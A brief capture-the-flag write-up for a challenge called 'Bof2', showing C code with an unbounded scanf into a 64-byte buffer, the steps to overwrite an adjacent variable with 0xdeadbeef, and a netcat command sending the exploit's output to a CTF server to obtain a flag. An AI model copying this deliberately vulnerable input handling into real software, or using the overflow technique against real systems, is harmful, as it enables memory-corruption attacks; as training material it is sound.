# Bof2

### this is the vulnerability
```
int correct = 0;
char bof[64];
scanf("%s",bof);
if(correct != 0xdeadbeef)
{
	puts("you suck!\n");
	fflush(stdout);
	exit(0);
}

win();

 ```

## goal

1. fill the buffer
2. overrite valuable correct with  0xdeadbeef
3. win();




### IN THE WILD

```
bof2$ python exploit.py
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ

kettle@OfKetchup:bof2$ python exploit.py | nc ctf.hackucf.org 9001
flag{KETTLEOFKETCHUP}

```
